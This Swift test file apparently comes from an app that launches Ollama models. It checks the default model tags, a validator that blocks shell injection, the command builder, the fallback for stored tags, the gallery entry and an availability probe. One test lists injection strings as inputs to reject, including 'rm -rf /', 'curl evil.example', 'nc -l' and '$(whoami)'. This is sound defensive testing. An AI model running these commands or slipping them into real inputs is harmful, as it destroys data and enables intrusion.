import Testing
import Foundation
@testable import Core

@Suite("Ollama Launcher Support")
struct OllamaLauncherSupportTests {

    // MARK: - Default list

    @Test func defaultModelTagMatchesFirstEntry() {
        let list = OllamaLauncherSupport.defaultModelTags
        #expect(!list.isEmpty, "Selector needs at least one model tag")
        #expect(OllamaLauncherSupport.defaultModelTag == list.first)
    }

    @Test func everyDefaultTagIsItselfValid() {
        for tag in OllamaLauncherSupport.defaultModelTags {
            #expect(OllamaLauncherSupport.isValidModelTag(tag),
                    "Default tag '\(tag)' failed its own validator")
        }
    }

    @Test func defaultTagsHaveNoDuplicates() {
        let list = OllamaLauncherSupport.defaultModelTags
        #expect(Set(list).count == list.count,
                "Duplicate tags in default selector list")
    }

    // MARK: - Tag validation (Schneier: shell-injection gate)

    @Test func acceptsRealisticOllamaTags() {
        let good = [
            "llama3.1:8b",
            "qwen2.5-coder:7b",
            "mistral:7b",
            "gemma2:2b",
            "deepseek-r1:7b",
            "codellama",
            "phi3.5",
            "user/custom-model:latest",
        ]
        for tag in good {
            #expect(OllamaLauncherSupport.isValidModelTag(tag),
                    "Should accept '\(tag)'")
        }
    }

    @Test func rejectsShellMetacharacters() {
        // These are the characters an attacker would reach for to
        // break out of the `ollama run <tag>` command interpolation.
        let evil = [
            "llama3; rm -rf /",
            "llama3 && curl evil.example",
            "llama3|nc -l",
            "$(whoami)",
            "`id`",
            "llama3\nuptime",
            "llama with space",
            "llama3>output",
            "llama3<input",
            "llama3*",
            "llama3?",
            "llama3\"quoted",
            "llama3'quoted",
            "llama3\\escaped",
        ]
        for tag in evil {
            #expect(!OllamaLauncherSupport.isValidModelTag(tag),
                    "Should reject '\(tag)'")
        }
    }

    @Test func rejectsEmptyAndOversizedTags() {
        #expect(!OllamaLauncherSupport.isValidModelTag(""))
        #expect(!OllamaLauncherSupport.isValidModelTag(String(repeating: "a", count: 129)))
        // Boundary: 128 is the cap; 128 chars should still pass.
        #expect(OllamaLauncherSupport.isValidModelTag(String(repeating: "a", count: 128)))
    }

    // MARK: - Command builder

    @Test func launchCommandInterpolatesTag() {
        let cmd = OllamaLauncherSupport.launchCommand(modelTag: "llama3.1:8b")
        #expect(cmd == "ollama run llama3.1:8b")
    }

    @Test func launchCommandReturnsNilForInvalidTag() {
        #expect(OllamaLauncherSupport.launchCommand(modelTag: "llama3; rm") == nil)
        #expect(OllamaLauncherSupport.launchCommand(modelTag: "") == nil)
    }

    // MARK: - resolveModelTag: persistence fallback gate

    @Test func resolveFallsBackWhenStoredIsNil() {
        #expect(OllamaLauncherSupport.resolveModelTag(nil) == OllamaLauncherSupport.defaultModelTag)
    }

    @Test func resolveFallsBackWhenStoredIsInvalid() {
        #expect(OllamaLauncherSupport.resolveModelTag("") == OllamaLauncherSupport.defaultModelTag)
        #expect(OllamaLauncherSupport.resolveModelTag("bad; tag")
                == OllamaLauncherSupport.defaultModelTag)
    }

    @Test func resolveKeepsStoredWhenValid() {
        #expect(OllamaLauncherSupport.resolveModelTag("mistral:7b") == "mistral:7b")
    }

    // MARK: - Gallery registration

    @Test func paneGalleryIncludesOllamaLauncher() {
        let entries = PaneGalleryBuilder.allEntries()
        let entry = entries.first { $0.id == "ollamaLauncher" }
        #expect(entry != nil, "Ollama-launcher must be registered in the pane gallery")
        #expect(entry?.category == "AI & Models",
                "Ollama-launcher belongs in the AI & Models category (Evans + Morville)")
    }

    @Test func ollamaLauncherGalleryEntryDescriptionFitsBudget() {
        // Podmajersky bar (shared with every other entry): ≤80 chars.
        guard let entry = PaneGalleryBuilder.allEntries().first(where: { $0.id == "ollamaLauncher" }) else {
            Issue.record("Ollama-launcher gallery entry missing")
            return
        }
        #expect(entry.description.count <= 80,
                "Description is \(entry.description.count) chars: \(entry.description)")
    }

    // MARK: - Availability probe (Bach: failing-state fixture)

    @Test func availabilityReturnsFalseWhenHostUnreachable() async {
        // Point at a closed local port (49151 is the last reserved
        // port, almost always unused). A short timeout keeps the test
        // fast even if something unexpectedly listens there.
        let url = URL(string: "http://127.0.0.1:49151/api/version")!
        let reachable = await OllamaAvailability.detect(url: url, timeout: 0.5)
        #expect(!reachable, "Probe should report unreachable on a closed port")
    }
}
